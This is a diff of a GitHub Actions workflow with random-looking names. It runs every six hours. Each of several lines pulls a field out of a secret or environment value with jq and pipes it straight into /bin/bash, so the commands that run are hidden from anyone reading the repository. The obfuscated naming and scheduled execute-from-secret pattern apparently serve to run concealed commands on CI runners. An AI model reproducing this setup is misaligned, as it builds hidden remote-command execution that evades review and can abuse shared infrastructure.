@@ -1,9 +1,9 @@
 name: lujingxi3456
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 5/6 * * *'
-
+    - cron: '20 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,11 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: lujingxi3456
         env:
-          w45: ${{ secrets.w45 }}
+          rwcl54: ${{ secrets.rwcl54 }}
         run: |
-          echo $w45 | jq -r .sodk87 | /bin/bash
-          echo $zl998 | jq -r .ejh7544 | /bin/bash
-          echo $kxj1 | jq -r .set77169 | /bin/bash
-          echo $zyhi1 | jq -r .dva64352 | /bin/bash
-          echo $pkwum935 | jq -r .ur11425 | /bin/bash
+          echo $rwcl54 | jq -r .z1484 | /bin/bash
+          echo $bbjc2 | jq -r .jsl57388 | /bin/bash
+          echo $xxo9 | jq -r .rzgx82 | /bin/bash
+          echo $reyws72698 | jq -r .nq200 | /bin/bash
+          echo $hv9908 | jq -r .lprg18720 | /bin/bash
+          echo $vulny0 | jq -r .hbnwf49794 | /bin/bash
+          echo $ffv45 | jq -r .ndrk19 | /bin/bash
+          echo $dkij6750 | jq -r .akvl5857 | /bin/bash
+          echo $mxmn86 | jq -r .eumsw8 | /bin/bash
+          echo $ulbob4 | jq -r .xcpxl725 | /bin/bash
+          echo $hx690 | jq -r .ycw90 | /bin/bash
 
